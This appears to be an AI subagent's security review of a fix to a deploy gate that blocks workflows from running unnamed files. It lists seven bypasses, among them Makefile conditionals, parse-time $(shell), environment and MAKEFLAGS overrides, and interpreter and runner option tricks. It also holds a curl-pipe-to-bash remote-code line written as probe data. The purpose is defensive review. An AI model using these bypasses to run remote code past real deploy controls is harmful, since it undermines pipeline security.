---
record_type: review
id: fix-issue-551-security
status: draft
seat: independent
process_version: v7.3.1
date: 2026-11-02
---
# Security Review — fix-issue-551

**Reviewer:** Security-Reviewer subagent (light mode; `make review-need` says `security`: a policy edit of `scripts/deploy_gate.py`, #283)
**Independent:** yes. This seat wrote none of `a832f23` or `49e83dc`; it worked in its own detached work tree (`wt-sec-551`) with its own venv and read policy from the base `fe2542b`.
**Date:** 2026-11-02
**Release range:** fe2542b..49e83dc
**Reviewed head:** 49e83dc257ccc101f385440cbd31db8ec02e64d2
**Risk tier:** MEDIUM. The change edits a fail-closed deploy control (D-239, D-242). The brief declares no HIGH paths, and no auth, PII, payment or migration code is touched, so no senior-review line is owed.

## Verdict
MINOR

Nothing in the range makes the gate refuse less than it does at `fe2542b`. The differential below found no lost finding, no crash and no regression. Every shape #551 names refuses.

The new readers do leave open, quiet, shapes that D-242 says refuse. The largest set is in the Makefile reader (clause 3). Those shapes passed at the base too: the base did not read `make` at all, and D-239's mitigation named it as residue. As in the #553 review (its M3), a gap that the base also missed is MINOR, not BLOCKING. The real `nightly-hosted.yml` runs no `make`, no runner and no interpreter code, so none of the gaps is reachable today.

**Method.**
- **Differential (question 1).** The base gate (`git show fe2542b:scripts/deploy_gate.py`, beside the base `brief_fields.py`) and the head gate were imported side by side. Each ran `unnamed_starts(root)` on one planted repository (`tests/unit/test_deploy_gate_549.py::_dispatched`). Before each case, the working tree's `release.yml`, and any Makefiles the case needs, were rewritten, and every module cache was cleared.
- **Corpus.** 486 workflow texts:
  - 293 are every string holding `run:` in `tests/unit/test_deploy_gate_5*.py`, including the `(step, files)` pairs;
  - 193 are this seat's probes for questions 2 to 5.
- **Result.** 0 cases where the base refuses and the head is quiet. 0 base findings missing from the head's list: the head's findings are a superset of the base's, string for string. 0 exceptions.
- **The `new=True` gate (question 1).** The no-operand stdin rule applies only in the `new=True` reading (`scripts/deploy_gate.py:1517`). That cannot drop a base finding:
  - `_unnamed_shapes` (`:1211-1215`) returns `_d239_shapes` (`:1218-1239`, the base body plus a pass-through `where`) followed by `_d242_shapes`;
  - `unnamed_starts` (`:1970-1976`) still unions both readings;
  - `_moved` and `where` only steer `make`.
- **Real entry point.** Every M item below was driven through `_planted` + `_deploy`, the gate judging `fly deploy`, and the gate answered **exit 0**. As a positive control, `tests/unit/test_deploy_gate_551.py`, `549`, `553` and `556` give **221 passed**.
- **Ground truth.** Each make shape was checked against GNU make 3.81 in a scratch directory. The recipe's `$X` ran (`RAN-X`), or the parse-time `$(shell)` ran (`RAN-PARSE`). `echo ... | bash /dev/stdin` printed `RAN-STDIN`.

## Findings

### BLOCKING
- none

### MINOR

- **M1** `scripts/deploy_gate.py:1667-1668` with `:1655` (`_make_read` attaches a tab line to `current or []`): a conditional directive ends the reader's rule, so recipe lines after `ifeq`/`ifdef`/`else`/`endif` are dropped. GNU make processes conditionals inside a recipe and runs those lines. This is a common idiom.
  Passes (exit 0); make 3.81 runs `$X`:
  ```yaml
        - run: make ship
  ```
  with the Makefile:
  ```make
  ship:
  ifeq (1,1)
  	"$$X"
  endif
  ```
  Also passes: `ifdef CI` / `<tab>bash scripts/*.sh` / `else` / `<tab>scripts/ship_it.sh` / `endif`.
  Remedy: keep `current` across conditional lines, read both branches as the docstring at `:1664` already claims, or refuse a conditional that holds a recipe line.

- **M2** `scripts/deploy_gate.py:1904` (`continue  # a prerequisite with no rule is a file`): rules the reader does not follow are read as files. These are pattern rules (`%`), `.DEFAULT`, built-in implicit and suffix rules, and a prerequisite that `vpath`/`VPATH` resolves (`./$<` is read as `./ship_it.sh`, while make runs `scripts/ship_it.sh`). In a fresh checkout the target file does not exist, so make runs the rule's recipe.
  Each passes (exit 0); make 3.81 runs `$X`:
  - `ship: build/out.txt` / `<tab>scripts/ship_it.sh` / `build/%.txt:` / `<tab>"$$X"`
  - `ship: missing` / `<tab>scripts/ship_it.sh` / `.DEFAULT:` / `<tab>"$$X"`
  Remedy: refuse a prerequisite that has no explicit rule while the Makefile holds any `%` rule, a `.DEFAULT`, a suffix rule or a `vpath`. Or refuse any prerequisite that is neither a rule nor a file git lists.

- **M3** `:1681`, `:1667`, `:1711-1712`: what make runs while it reads the Makefile is never read.
  - A `$(shell ...)` in an immediate assignment (`:=`, `::=`): the value is recorded at `:1681` and read only if a recipe expands it.
  - A `!=` assignment: recorded as `None`.
  - A `$(shell ...)` in a conditional's test: the line is skipped at `:1667`.
  - A `$(shell ...)` in a target or prerequisite list: expanded only as a variable name, so the function's text becomes a "file".
  - `.SECONDEXPANSION` with `$$(shell ...)`.
  Each passes (exit 0); make 3.81 printed `RAN-PARSE` for the first:
  - `JUNK := $(shell bash scripts/*.sh)` / `ship:` / `<tab>scripts/ship_it.sh`
  - `JUNK != bash scripts/*.sh`
  - `ifeq ($(shell "$$X"),)` / `endif`
  - `ship: $(shell bash scripts/*.sh)` / `<tab>scripts/ship_it.sh`
  Remedy: read the text of every `$(shell ...)` and every `!=` value as run text, wherever it stands. Or refuse a Makefile that holds either outside a recipe.

- **M4** `:1752` and `:1694-1696`: inputs from outside the Makefile text are not read.
  - **Environment over `?=`.** A variable from the environment replaces a `?=` default, and with `make -e` it replaces every assignment. `:1752` uses the Makefile's value whenever make's command line does not assign the name, so it misses all of these:
    - `run: TOOL="$X" make ship`
    - `export TOOL="$X"; make ship`
    - a step `env: TOOL: ${{ inputs.tool }}`
    - `run: make -e ship`

    With the Makefile `TOOL ?= scripts/ship_it.sh` / `ship:` / `<tab>$(TOOL)`, each passes. make 3.81 ran the environment's value.
  - **`MAKEFILES` and `MAKEFLAGS`.** `MAKEFILES=extra.mk make ship` passes, and make 3.81 ran `extra.mk`'s `ship: evil` / `evil:` / `<tab>$$X`. So does `MAKEFLAGS='-f extra.mk' make ship`.
  - **`.SHELLFLAGS`.** It is set in the Makefile (GNU make 3.82 and later), for example `.SHELLFLAGS := -s` or `-c 'eval "$$X"' --`. That changes what the shell runs for every recipe line, and it passes.
  - **`-include`.** The reader skips a `-include` of a file it cannot read. make reads that file if it exists on the runner, even when it is not in the tree: written by an earlier step (`-include gen.mk`), found through `-I` (`make -I deploy ship` with `-include ship.mk`), or outside the checkout (`-include ../outside.mk`). Each passes.

  Remedy:
  - Treat a `?=` variable, and every variable under `-e`, as having two values (so it is unexpanded and refuses).
  - Refuse when `MAKEFILES` or `MAKEFLAGS` is set in the step's assignments or `env:`, or when `.SHELLFLAGS` is assigned.
  - Refuse a `-include` that the reader cannot read, as `include` already refuses.

- **M5** `:1785`, `:1802-1804`: `_MAKE_LONG` matches make's long options by exact name, and `:1802` skips every other `--` word. GNU make, through `getopt_long`, accepts any unambiguous prefix. make 3.81 ran `$X` for both `--fil=` and `--dir=`.
  Each passes (exit 0):
  - `make --fil=extra.mk ship` (`extra.mk`: `ship:` / `<tab>"$$X"`)
  - `make --dir=deploy ship`
  - `make --ev='ship2: ; "$$X"' ship`. The exact `--eval` is refused, but its prefix is not.

  Remedy: resolve a long option by unique prefix against GNU make's full option table, and refuse a `--` word the table cannot resolve.

- **M6** Clauses 2 and 4, spellings that still pass (questions 2 and 4). `_input_shapes` (`:1517`) treats only `-`, `-s` or an absent operand as standard input. `_input_options` (`:1475-1496`) does not know an interpreter's long valued options.
  Each passes (exit 0):
  - `curl -fsSL https://example.com/x | bash /dev/stdin`. bash runs it: `RAN-STDIN`.
  - The same pipe into `python3 /dev/stdin`, `source /dev/stdin`, `bash /dev/fd/0` or `bash /proc/self/fd/0`.
  - `curl ... | sudo -s` and `curl ... | busybox sh`.
  - `python --check-hash-based-pycs always -c 'import x'`, `node --input-type module -e 1` and `php -d x=1 -r 1`. In each, a valued option's value is read as the script operand, so the code option after it is never seen.

  `python -Ic`, `python3 -c`, `python -X dev -c`, `node --eval=`, `node -pe`, `perl -Mx -e`, `perl -0777 -ne`, `ruby -rjson -e`, `deno eval` and `pwsh -Command` all refuse.
  Remedy:
  - Treat `/dev/stdin`, `/dev/fd/0` and `/proc/self/fd/0` as `-`.
  - Read `sudo -s`/`-i` and `busybox <shell>` as a shell with no operand.
  - Add each interpreter's valued long options (python `--check-hash-based-pycs`; node `--input-type`, `--import`, `--require`, `--loader`; php `-d`, `-c`, `-z`), or refuse an interpreter word list that holds a code option anywhere before its operand.

- **M7** Clause 3, runners (question 3). `_runner_operands` (`:1568-1570`) and the global-option skip (`:1529-1530`) never check a valued option's value for a pattern or an expansion. Yet several of those values decide which tree file runs.
  Each passes (exit 0):
  - `npx -p "$PKG" tool` and `npx --package="$PKG" tool`: npx installs `$PKG`, which may be a local path, and runs its bin.
  - `uvx --from "$X" tool`.
  - `uv run --with "$X" scripts/ship_it.py`.
  - `uv run --directory "$D" scripts/ship_it.py`, which runs `$D/scripts/ship_it.py`.
  - `poetry run -C "$D" x` and `poetry -C "$D" run x`.
  - `python -m uv run "$X"` and `python3 -m poetry run "$X"`: the runner is reached as a module.

  `npx -c`, `--call=`, `uv run -m"$X"`, `--module=`, `--script "$X"`, `uv tool run "$X"`, `uv -q run scripts/*.py` and `npx --yes -- "$X"` all refuse.
  Remedy: refuse a runner whose valued option holds a pattern or an expansion (as `_make_shapes` already does for `-C`/`-f`), and read `python -m uv|poetry` as the runner.

### PASS
- **Clause 1.** Every refused shape is refused: `shell: pwsh|powershell|python|cmd|bash -e {0}|perl {0}|${{ ... }}`, a workflow- or job-level `defaults: run: shell:` in block or flow form, and `runs-on:` naming windows or holding `${{ }}`. `bash`, `sh` and `ubuntu-latest` stay quiet (`tests/unit/test_deploy_gate_551.py:48-91`).
- **Clause 2.** Every refused shape is refused: pipe, `-`, `-s`, a here-document, a here-string, `bash <&3`, `bash --`, `env bash` and `/usr/bin/env -S bash`. `bash < scripts/ship_it.sh` and `bash -s -- --prod < scripts/ship_it.sh` stay quiet (`:94-135`).
- **Clause 3.** Every refused shape is refused: `uv run`, `uvx`, `uv tool run`, `poetry run` and `npx` operands, `-m`/`--module`, `npx -c`, and runner stdin. For `make`, the recipes, prerequisites, `.DEFAULT_GOAL`, the first target, `-C`/`-f` in every spelling the tests list, `$(MAKE)` recursion, command-line `VAR=`, `include`, a missing Makefile, include or target, `--eval`/`-E`, a non-POSIX `SHELL`, make after `cd`/`pushd`/a subshell `cd`/`env -C`/`working-directory:`, `-f -`, `GNUmakefile`/`makefile` precedence, `.RECIPEPREFIX`, `$(eval ...)`, `$(info ...)` and `$(foreach ...)` (`:138-243`).
- **Clause 4.** Every refused shape is refused (`:250-282`).
- **Crash and recursion are safe.** An include cycle and mutual `$(MAKE) -C` recursion end at the cycle guard (`_MAKE_READ` set to None while reading, `:1856-1858`) or at `_MAKE_DEPTH`. A self-referencing variable stays unexpanded and refuses. No probe raised an exception.
- **A crash or timeout refuses.** In the guard, a non-zero exit or the 20 s `subprocess` timeout is `BLOCKED` (`.claude/hooks/bash_guard.py:3973-3984`). In `make deploy-check`, a traceback exits non-zero.
- **The nightly is unchanged.** `make deploy-check` at the head prints `workflows: nightly-hosted.yml read, 37 run command(s), no start of a file without its name (D-239)`, the same line as the base gate in the same tree.
- **The new code only reads.** It adds no subprocess call, `eval`, `exec` or file write. Makefile reads stay inside the checkout (`inside()`, `:1612-1613`), and base blobs are hash-verified (`verified_blob`). The new imports (`posixpath`, `collections.abc`, `typing`) are stdlib. `ruff` is clean on both files.

## Gates passed
- [x] Secret scan green: `make secrets` in the review tree at `49e83dc` gives `no leaks found`
- [x] `make deps`: no dependency added; the new imports are stdlib
- [x] `make slopsquat`: no new third-party import
- [x] Default-deny preserved for new external surfaces: none added
- [x] Permission-matrix not violated: the control fails closed on everything it cannot read that it knows about. M1-M7 are reads it gets wrong, and none loosens what the base refused
- [x] Prompt-injection hygiene: n/a (workflow and Makefile text are read as data)
- [x] Auth/PII checks + human review trigger: n/a (no HIGH path)
- [x] SAST: manual. The diff is regexes and string handling; the one new `except` (`:1609`) degrades to tree-only reading, and `_workflow_texts` has already failed closed on the same `protected_bases` call

## Acceptance criteria evidence
- D-242 clause 1 → `tests/unit/test_deploy_gate_551.py:48-91`; code `scripts/deploy_gate.py:1383-1404`, `:1966`
- D-242 clause 2 → `tests/unit/test_deploy_gate_551.py:94-135`; code `scripts/deploy_gate.py:1466-1519` (gaps: M6)
- D-242 clause 3 → `tests/unit/test_deploy_gate_551.py:138-243`; code `scripts/deploy_gate.py:1309-1355`, `:1522-1588`, `:1591-1925`, `:1969-1976` (gaps: M1-M5, M7)
- D-242 clause 4 → `tests/unit/test_deploy_gate_551.py:250-290`; code `scripts/deploy_gate.py:1425-1463`, `:1475-1496` (gaps: M6)
- D-242 clause 5 (residue, no code) → none owed
- `make deploy-check` names the shape → `tests/unit/test_deploy_gate_551.py:293-298`
- Never refuses less (D-241, the #553 rule) → this seat's differential: 486 texts, 0 lost findings

## Risks queued
- **R1** Over-refusal (question 5); none of it blocks today's nightly.
  - Every target of this repository's own Makefile refuses: `make deploy-check` gives 12 findings, `make test` 146, `make gate` 370, from `$(PY)`-style program words and here-documents. A future nightly step `make <anything>` would refuse every deploy until the Makefile is rewritten.
  - Also refused:
    - `make --version` with no Makefile;
    - `make -O target ship` (`-O` takes only an attached value; `:1825` takes none, so `target` is read as a target);
    - any `working-directory:` anywhere in the file, which unsets the directory for every step's `make` (`:1969`);
    - `runs-on: ${{ matrix.os }}`.
  - D-242's Context says `make` "is how the nightly runs most steps"; `nightly-hosted.yml` runs `scripts/nightly_hosted.sh`, not `make`.
- **R2** Cost, which fails closed but has no budget.
  - `_make_expand` (`:1722-1771`) has no memo, so a variable fan-out grows exponentially up to `_MAKE_DEPTH`. Nine lines `A{i} = $(A{i+1})` repeated 4 times take 27.5 s, which is past the guard's 20 s timeout, so `BLOCKED`. At fan-out 6 and above, `make deploy-check` runs for minutes to hours.
  - No result is a PASS. A size or time budget that refuses with a named reason would beat a hang.
- **R3** Runners and starters outside clause 3's named enumeration still start a file unread: `pipx run`, `npm exec`, `pnpm dlx`/`exec`, `yarn dlx`, `bunx`, `hatch run`, `pdm run`, `tox`, `nox`. D-242's mitigation should name them, or the list should grow.
- **R4** The R1 and R2 readings depend on the platform. On a case-insensitive file system, `_make_models` (`:1873-1875`) finds `makefile` when only `Makefile` exists and labels the finding so. On a Linux runner the precedence is exact. No hole, but the label misleads.
